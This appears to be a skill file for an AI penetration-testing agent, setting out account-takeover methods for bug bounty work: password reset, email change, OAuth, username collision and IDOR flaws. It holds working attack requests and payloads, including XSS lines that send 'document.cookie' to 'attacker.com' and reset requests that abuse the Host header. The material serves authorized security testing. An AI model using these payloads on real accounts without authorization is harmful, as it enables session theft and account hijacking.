<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: account-takeover
description: Account takeover methodology — password reset flaws, token predictability, OAuth misconfigurations, email verification bypass, username collision, and full ATO attack chains
---

# Account Takeover (ATO)

ATO = gaining access to another user's account. Combines vulnerabilities across auth flows. Highest-impact finding in bug bounty.

---

## Password Reset Flaws

### Reset Token in URL (Referer Leakage)

    # Password reset link: https://target.com/reset?token=SECRET_TOKEN
    # If reset page loads external resources (analytics, CDN, fonts):
    # Referer header sent to third party: Referer: https://target.com/reset?token=SECRET_TOKEN
    # → Token leaked to third party

    # Check: load password reset link → inspect network requests → find Referer headers

### Weak/Predictable Reset Token

    # Request 5 password reset tokens for test accounts → look for patterns:
    # Sequential: ABC123, ABC124, ABC125 → predictable
    # Time-based: token = md5(username + timestamp) → brute-forceable
    # Short: 6-digit numeric → brute in <1M requests

    # Entropy check (token should be 128+ bits of randomness):
    python3 -c "
    import base64, hashlib
    tokens = ['<token1>', '<token2>', '<token3>']
    for t in tokens:
        print(f'Token: {t}, Length: {len(t)}, Entropy estimate: {len(t)*4} bits')
    "

### Token Not Invalidated After Use

    # Use reset token → change password → try same token again:
    curl -X POST http://target.com/reset-password \
      -d "token=<used_token>&password=NewPass123!"
    # If success → token reusable

### Host Header Injection in Reset Email

    # See host_header_injection.md
    curl -X POST http://target.com/forgot-password \
      -H "X-Forwarded-Host: attacker.com" \
      -d "email=victim@target.com"
    # Reset link goes to attacker.com → attacker clicks it → account takeover

### Reset Link Not Expiring

    # Request reset → wait 24 hours → use link:
    curl "https://target.com/reset?token=<token>"
    # Should return: "Token expired"
    # If still works → no expiry → ATO if attacker gets old email access

---

## Email Change → Account Takeover

### Pre-Change Email Verification Bypass

    # Request email change to attacker@evil.com
    # Verification email sent to old email AND new email?
    # If verification sent to NEW email only → attacker confirms own change → ATO

### Email Change Without Password

    # Test: can email be changed without confirming current password?
    curl -X POST http://target.com/account/email \
      -H "Cookie: session=<victim_session>" \
      -d "new_email=attacker@evil.com"

### Email Confirmation Link Reuse

    # Change email → get confirmation link → revert email change → use old link
    # If link still works → change email to anything

---

## Username Collision / Account Merge

    # Register with variations of existing username:
    # Existing: "admin" → Register: "Admin", "ADMIN", "admin " (trailing space), "admin\x00"
    # If login normalizes but registration doesn't → collision → access admin account

    # NULL byte truncation:
    username = "admin%00attacker" → stored as "admin" → login as admin

    # Unicode normalization:
    # "ＡＤmin" (fullwidth) normalizes to "ADmin" → collision with "ADmin"

---

## OAuth Misconfiguration → ATO

### Redirect URI Bypass

    # OAuth authorization endpoint:
    # Legitimate: ?redirect_uri=https://target.com/callback
    # Attack: ?redirect_uri=https://attacker.com/callback
    # If allowed → auth code/token sent to attacker.com

    # Subdomain open redirect:
    ?redirect_uri=https://target.com.attacker.com/
    ?redirect_uri=https://attacker.com%2Ftarget.com
    ?redirect_uri=https://target.com/logout?redirect=//attacker.com/

    # Path traversal:
    ?redirect_uri=https://target.com/../../attacker.com

### State Parameter Missing → CSRF

    # OAuth flow without state parameter:
    # 1. Attacker initiates OAuth → gets auth URL with no state
    # 2. Drops the request before redirect (keeps auth URL)
    # 3. Victim visits attacker's page → CSRF → victim's account linked to attacker's OAuth

### Token Leakage in Referer

    # After OAuth callback: https://target.com/callback?code=AUTH_CODE
    # If page loads external resources → auth code in Referer → code stolen

### Account Linking → ATO

    # If target allows linking multiple OAuth providers:
    # Login as victim (via compromised OAuth provider or IDOR)
    # Link attacker's Google account
    # Login to victim account via attacker's Google → ATO

    # See oauth_saml.md for complete OAuth attack playbook

---

## API Key / Token Exposure

    # Hardcoded in JS:
    web_search("site:target.com inurl:.js")
    curl https://target.com/app.js | grep -i "api.?key\|token\|secret\|password"

    # In git history:
    git log --all -p | grep -E "api.?key|token|secret"
    trufflehog git <repo_url> --json

    # In local storage / cookies (via XSS):
    # See xss.md for cookie/localStorage extraction

---

## Account Takeover via XSS → Cookie Theft

    # Store XSS → steal session cookie:
    # Payload:
    fetch('https://attacker.com/steal?c=' + document.cookie)
    new Image().src = 'https://attacker.com/?c=' + encodeURIComponent(document.cookie)

    # If HttpOnly: use XSS to make authenticated requests (CSRF bypass):
    fetch('https://target.com/api/change-email', {
      method: 'POST',
      body: JSON.stringify({email: 'attacker@evil.com'}),
      credentials: 'include'
    })

---

## IDOR on Account Management

    # Change password for other users via user ID:
    POST /api/v1/users/12345/password   ← victim's ID
    {"new_password": "AttackerPass!"}

    # Change email for other users:
    PUT /api/v1/users/12345
    {"email": "attacker@evil.com"}

    # See idor.md for full IDOR methodology

---

## Complete ATO Chain Examples

### Chain 1: Password Reset + Host Header
1. `POST /forgot-password` with `X-Forwarded-Host: attacker.com`
2. Victim requests reset → link in email → `https://attacker.com/reset?token=xxx`
3. Attacker server logs the token
4. Attacker uses token: `POST /reset-password` → owns account

### Chain 2: XSS → Session Hijack
1. Find stored XSS in profile field
2. Inject: `<script>fetch('//attacker.com/?c='+document.cookie)</script>`
3. Admin/victim views profile → cookie sent to attacker
4. Attacker uses cookie → authenticated as victim

### Chain 3: OAuth CSRF + Account Link
1. Initiate OAuth flow → capture URL (no state parameter)
2. Victim visits CSRF page → links attacker's OAuth to victim account
3. Attacker logs in via own OAuth → gets victim's account

---

## Pro Tips

1. **Password reset flow is #1 ATO vector** — test every step: token entropy, expiry, reuse, Host header
2. Check `Referer` header leakage when reset link loaded — analytics and CDN providers receive tokens
3. Username normalization collisions (case, spaces, unicode) often overlooked by developers
4. OAuth without state parameter = CSRF → account linking ATO
5. Always test email change: requires password? sends to old or new email? confirmation reusable?
6. IDOR on account management endpoints = mass ATO across all users

## Summary

ATO testing order:
1. Password reset: Host header injection → token predictability → token reuse → expiry
2. Email change: no password required → verify link sent to new address → link reuse
3. OAuth: redirect_uri bypass → state parameter → token in Referer
4. IDOR: numeric user IDs on account management endpoints
5. XSS → session cookie theft → account access
6. API key extraction from JS files, git history, local storage
